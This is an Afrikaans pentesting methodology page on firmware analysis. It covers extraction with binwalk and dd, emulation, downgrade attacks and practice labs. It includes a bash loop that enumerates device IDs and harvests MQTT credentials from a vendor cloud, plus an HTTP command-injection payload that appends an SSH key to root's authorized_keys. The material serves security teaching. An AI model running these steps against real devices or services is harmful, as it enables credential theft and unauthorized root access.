# Firmware-analise

{{#include ../../banners/hacktricks-training.md}}

## **Inleiding**

### Verwante hulpbronne


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

Firmware is noodsaaklike sagteware wat toestelle in staat stel om korrek te funksioneer deur die bestuur en fasilitering van kommunikasie tussen die hardewarekomponente en die sagteware waarmee gebruikers interaksie het. Dit word in permanente geheue gestoor, wat verseker dat die toestel vanaf die oomblik wat dit aangeskakel word toegang tot belangrike instruksies het, wat tot die opstart van die bedryfstelsel lei. Die ondersoek na en moontlike wysiging van firmware is 'n kritieke stap in die identifisering van sekuriteitskwesbaarhede.

## **Inligtingsversameling**

**Inligtingsversameling** is 'n kritieke aanvanklike stap om 'n toestel se samestelling en die tegnologieë wat dit gebruik te verstaan. Hierdie proses behels die insameling van data oor:

- Die CPU-argitektuur en die bedryfstelsel waarop dit loop
- Bootloader-spesifieke besonderhede
- Hardeware-lay-out en datasheets
- Codebase-metrieke en bronlokasies
- Eksterne libraries en lisensietipes
- Opdateringsgeskiedenis en regulatoriese sertifiseringe
- Argitektoniese en vloediagramme
- Sekuriteitsassesserings en geïdentifiseerde kwesbaarhede

Vir hierdie doel is open-source intelligence (OSINT)-instrumente onmisbaar, soos ook die ontleding van beskikbare open-source sagtewarekomponente deur manuele en geoutomatiseerde hersieningsprosesse. Gereedskap soos [Coverity Scan](https://scan.coverity.com) en [Semmle’s LGTM](https://lgtm.com/#explore) bied gratis statiese analise wat gebruik kan word om potensiële probleme op te spoor.

## **Firmware-verkryging**

Die verkryging van firmware kan deur verskeie metodes benader word, elk met 'n eie vlak van kompleksiteit:

- **Direk** van die bron (ontwikkelaars, vervaardigers)
- **Bou** dit volgens voorsiene instruksies
- **Aflaai** vanaf amptelike ondersteuningswebwerwe
- Gebruik **Google dork** queries om gehoste firmware-lêers te vind
- Toegang tot cloud-opberging direk, met gereedskap soos [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Intersepteer **opdaterings** via man-in-the-middle tegnieke
- **Uittreksel** vanaf die toestel via verbindings soos UART, JTAG, of PICit
- Sniffing vir update-versoeke binne toestelkommunikasie
- Identifiseer en gebruik hardgekodeerde update-endpoints
- Dumping vanaf die bootloader of netwerk
- Verwyder en lees die stoorchip wanneer alles anders misluk, met toepaslike hardeware-instrumente

## Analyzing the firmware

Nou dat jy **die firmware het**, moet jy inligting daaroor onttrek om te weet hoe om dit te hanteer. Verskillende gereedskap wat jy daarvoor kan gebruik:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
As jy nie veel met daardie gereedskap vind nie, kontroleer die **entropie** van die image met `binwalk -E <bin>`, as die entropie laag is, is dit waarskynlik nie versleuteld nie. As die entropie hoog is, is dit waarskynlik versleuteld (of op een of ander manier gekomprimeer).

Verder kan jy hierdie gereedskap gebruik om **lêers wat in die firmware ingebed is** te onttrek:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Of [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) om die lêer te inspekteer.

### Kry die lêerstelsel

Met die vooraf genoemde gereedskap soos `binwalk -ev <bin>` behoort jy die lêerstelsel te kon **uittrek**.\
Binwalk onttrek dit gewoonlik in 'n **gids met die naam van die lêerstelseltipe**, wat gewoonlik een van die volgende is: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Handmatige lêerstelsel-onttrekking

Soms sal binwalk **nie die magic byte van die lêerstelsel in sy signatures hê nie**. In daardie gevalle, gebruik binwalk om die **offset van die lêerstelsel te vind en die gekomprimeerde lêerstelsel uit die binêre te carve** en die lêerstelsel **handmatig uit te trek** volgens sy tipe deur die volgende stappe te volg.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Voer die volgende **dd command** uit vir die carving van die Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatiewelik kan die volgende opdrag ook uitgevoer word.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Vir squashfs (gebruik in die voorbeeld hierbo)

`$ unsquashfs dir.squashfs`

Lêers sal daarna in "`squashfs-root`" gids wees.

- CPIO argieflêers

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Vir jffs2 lêerstelsels

`$ jefferson rootfsfile.jffs2`

- Vir ubifs lêerstelsels met NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware-ontleding

Sodra die firmware verkry is, is dit noodsaaklik om dit te ontleed om die struktuur en potensiële kwesbaarhede te verstaan. Hierdie proses behels die gebruik van verskeie gereedskap om die firmware-beeld te ontleed en waardevolle data daaruit te onttrek.

### Aanvanklike analise-gereedskap

'n Reeks opdragte word verskaf vir die aanvanklike inspeksie van die binêre lêer (verwys na as `<bin>`). Hierdie opdragte help om lêertipes te identifiseer, strings te onttrek, binêre data te ontleed, en die partisies en lêerstelsel-besonderhede te verstaan:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Om die enkripsiestatus van die image te bepaal, word die **entropie** nagegaan met `binwalk -E <bin>`. Lae entropie dui op 'n gebrek aan enkripsie, terwyl hoë entropie moontlike enkripsie of kompressie aandui.

Vir die uittrekking van **ingeslote lêers**, word gereedskap en hulpbronne soos die **file-data-carving-recovery-tools** dokumentasie en **binvis.io** vir lêerinspeksie aanbeveel.

### Uittrekking van die lêerstelsel

Deur `binwalk -ev <bin>` te gebruik, kan mens gewoonlik die lêerstelsel uittrek, dikwels in 'n gids met 'n naam na die lêerstelseltipe (bv. squashfs, ubifs). Echter, wanneer **binwalk** versuim om die lêerstelseltipe te herken weens ontbrekende magic bytes, is handmatige uittrekking nodig. Dit behels die gebruik van `binwalk` om die offset van die lêerstelsel te vind, gevolg deur die `dd`-opdrag om die lêerstelsel uit te kerf:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Afterwards, depending on the filesystem type (e.g., squashfs, cpio, jffs2, ubifs), different commands are used to manually extract the contents.

### Lêerstelsel-analise

Sodra die lêerstelsel onttrek is, begin die soektog na veiligheidsfoute. Daar word aandag gegee aan onveilige netwerk-daemons, hardcoded credentials, API endpoints, update server functionalities, uncompiled code, startup scripts, en compiled binaries vir offline-analise.

**Belangrike lokasies** en **items** om te inspekteer sluit in:

- **etc/shadow** en **etc/passwd** vir user credentials
- SSL certificates and keys in **etc/ssl**
- Konfigurasie- en skriplêers vir potensiële kwesbaarhede
- Ingebedde binaries vir verdere analise
- Algemene IoT-toestel webservers en binaries

Verskeie gereedskap help om sensitiewe inligting en kwesbaarhede binne die lêerstelsel op te spoor:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) en [**Firmwalker**](https://github.com/craigz28/firmwalker) vir sensitive information search
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) vir omvattende firmware-analise
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), en [**EMBA**](https://github.com/e-m-b-a/emba) vir static en dynamic analysis

### Sekuriteitskontroles op gecompileerde binaries

Beide bronkode en gecompileerde binaries wat in die lêerstelsel gevind word, moet ondersoek word vir kwesbaarhede. Gereedskap soos **checksec.sh** vir Unix-binaries en **PESecurity** vir Windows-binaries help om onbeskermde binaries te identifiseer wat uitgebuit kan word.

## Verkryging van cloud config en MQTT credentials via afgeleide URL-tokens

Baie IoT-hubs haal hul per-toestel konfigurasie van 'n cloud-endpoint wat soos volg lyk:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Tydens firmware-analise kan jy vind dat <token> plaaslik afgelei word uit die deviceId met 'n hardcoded secret, byvoorbeeld:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Hierdie ontwerp maak dit moontlik vir enigiemand wat 'n deviceId en die STATIC_KEY leer, om die URL te rekonstrueer en cloud config te trek, wat dikwels plaintext MQTT credentials en topic prefixes openbaar.

Praktiese werkvloei:

1) Haal deviceId uit UART-bootlogs

- Koppel 'n 3.3V UART-adapter (TX/RX/GND) en neem logs op:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Kyk na reëls wat die cloud config URL-patroon en broker address uitdruk, byvoorbeeld:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Herstel STATIC_KEY en token-algoritme uit firmware

- Laai binêre lêers in Ghidra/radare2 en soek na die config-pad ("/pf/") of MD5-gebruik.
- Bevestig die algoritme (bv. MD5(deviceId||STATIC_KEY)).
- Bepaal die token in Bash en maak die digest hoofletters:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Oes cloud config en MQTT credentials

- Stel die URL saam en haal JSON met curl; ontleed met jq om secrets te onttrek:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Misbruik plaintext MQTT en swak topic ACLs (indien teenwoordig)

- Gebruik herwonne inlogbewyse om op onderhoudsonderwerpe in te teken en na sensitiewe gebeurtenisse te soek:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumereer voorspelbare toestel IDs (op skaal, met toestemming)

- Baie ecosysteme sluit vendor OUI/product/type bytes in, gevolg deur 'n sekwensiële agtervoegsel.
- Jy kan kandidaat IDs deurloop, tokens aflei en configs programmaties ophaal:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Aantekeninge
- Kry altyd uitdruklike toestemming voordat jy mass enumeration probeer uitvoer.
- Verkies emulation of static analysis om geheime te herwin sonder om teiken-hardware te wysig waar moontlik.

Die proses van die emulering van firmware maak **dynamic analysis** moontlik, hetsy van 'n toestel se werking of van 'n individuele program. Hierdie benadering kan uitdagings ondervind met hardware- of architecture-afhanklikhede, maar die oordrag van die root filesystem of spesifieke binaries na 'n toestel met ooreenstemmende architecture en endianness, soos 'n Raspberry Pi, of na 'n voorafgeboude virtual machine, kan verdere toetsing vergemaklik.

### Emulering van individuele binaries

Om individuele programme te ondersoek, is dit krities om die program se endianness en CPU architecture te identifiseer.

#### Voorbeeld met MIPS Architecture

Om 'n MIPS architecture binary te emuleer, kan 'n mens die opdrag gebruik:
```bash
file ./squashfs-root/bin/busybox
```
En om die nodige emulasie-gereedskap te installeer:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` word gebruik, en vir little-endian binaries sal `qemu-mipsel` die keuse wees.

#### ARM Architecture Emulation

Vir ARM-binaries is die proses soortgelyk, met die `qemu-arm` emulator wat vir emulasie gebruik word.

### Full System Emulation

Gereedskap soos [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) en ander fasiliteer volledige firmware-emulasie, outomatiseer die proses en help met dinamiese analise.

## Dynamic Analysis in Practice

Op hierdie stadium word óf 'n werklike óf 'n geëmuleerde toestelomgewing vir analise gebruik. Dit is noodsaaklik om shell-toegang tot die OS en filesystem te behou. Emulasie nabootsing mag nie perfek hardware-interaksies weerspieël nie, wat af en toe 'n herbegin van die emulasie vereis. Analise moet die filesystem weer nagaan, uitgesette webpages en netwerkdienste uitbuit en bootloader-kwesbaarhede ondersoek. Firmware-integriteitstoetse is krities om potensiële backdoor-kwesbaarhede te identifiseer.

## Runtime Analysis Techniques

Runtime-analise behels interaksie met 'n proses of binary in sy uitvoeromgewing, en gebruik gereedskap soos gdb-multiarch, Frida, en Ghidra om breakpoints te stel en kwesbaarhede deur fuzzing en ander tegnieke te identifiseer.

## Binary Exploitation and Proof-of-Concept

Die ontwikkeling van 'n PoC vir geïdentifiseerde kwesbaarhede vereis 'n diep begrip van die teiken-argitektuur en programmering in laervlak tale. Binaire runtime-beskermings in embedded stelsels is skaars, maar wanneer teenwoordig kan tegnieke soos Return Oriented Programming (ROP) nodig wees.

## Prepared Operating Systems for Firmware Analysis

Bedryfstelsels soos [AttifyOS](https://github.com/adi0x90/attifyos) en [EmbedOS](https://github.com/scriptingxss/EmbedOS) verskaf voorafgekonfigureerde omgewings vir firmware security testing, toegerus met die nodige gereedskap.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS is 'n distro bedoel om jou te help met security assessment en penetration testing van Internet of Things (IoT) toestelle. Dit bespaar baie tyd deur 'n vooraf-gekonfigureerde omgewing met alle nodige gereedskap vooringelaai te verskaf.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system gebaseer op Ubuntu 18.04, voorafgelaai met firmware security testing tools.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Selfs wanneer 'n vendor kriptografiese signature-checks vir firmware images implementeer, word **version rollback (downgrade) protection dikwels weggelaat**. Wanneer die boot- of recovery-loader net die signature met 'n embedded public key verifieer maar nie die *version* (of 'n monotonic counter) van die image wat geflash word vergelyk nie, kan 'n aanvaller wettiglik 'n **ouer, kwesbare firmware wat steeds 'n geldige signature dra** installeer en sodoende opgeloste kwesbaarhede herintroduseer.

Tipiese aanval-werkvloei:

1. **Bekom 'n ouer signed image**
* Haal dit van die vendor se publieke downloadportaal, CDN of support-werf af.
* Ekstraheer dit uit companion mobile/desktop applications (bv. binne 'n Android APK onder `assets/firmware/`).
* Kry dit uit derdeparty-beramings soos VirusTotal, internet-argiewe, forums, ens.
2. **Upload of bedien die image aan die toestel** via enige blootgestelde update-kanaal:
* Web UI, mobile-app API, USB, TFTP, MQTT, ens.
* Baie verbruikers-IoT-toestelle openbaar *unauthenticated* HTTP(S) endpoints wat Base64-encoded firmware blobs aanvaar, dit server-side decode en recovery/upgrade trigger.
3. Na die downgrade, benut 'n kwesbaarheid wat in die nuwer uitgawe gepatch is (byvoorbeeld 'n command-injection filter wat later bygevoeg is).
4. Opsioneel flash die nuutste image terug of skakel updates uit om opsporing te vermy sodra persistentie verkry is.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
In die kwesbare (downgraded) firmware word die `md5`-parameter direk in 'n shell-opdrag geplaas sonder sanitisering, wat die invoeging van willekeurige opdragte toelaat (hier — waardeur SSH key-based root access moontlik gemaak word). Later firmware-weergawes het 'n basiese karakterfilter ingestel, maar die gebrek aan downgrade-beskerming maak die regstelling sinloos.

### Uittrekking van Firmware uit mobiele apps

Baie verskaffers pak volledige firmware-images in hul begeleidende mobiele apps sodat die app die toestel oor Bluetooth/Wi‑Fi kan opdateer. Hierdie pakkette word gewoonlik onversleuteld in die APK/APEX gestoor onder paaie soos `assets/fw/` of `res/raw/`. Tools soos `apktool`, `ghidra`, of selfs net `unzip` laat jou toe om signed images te onttrek sonder om die fisiese hardware aan te raak.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Kontrolelys vir die beoordeling van update-logika

* Is die transport/authentication van die *update endpoint* voldoende beskerm (TLS + authentication)?
* Vergelyk die toestel **version numbers** of 'n **monotonic anti-rollback counter** voordat dit ge-flash word?
* Word die image geverifieer binne 'n secure boot chain (bv. signatures checked by ROM code)?
* Voer userland code addisionele sanity checks uit (bv. allowed partition map, model number)?
* Hergebruik *partial* of *backup* update flows dieselfde validation logic?

> 💡  As enige van die bogenoemde ontbreek, is die platform waarskynlik kwesbaar vir rollback attacks.

## Kwetsbare firmware om te oefen

Om te oefen om kwetsbaarhede in firmware te ontdek, gebruik die volgende vulnerable firmware-projekte as beginpunt.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Verwysings

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Opleiding en Sertifisering

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
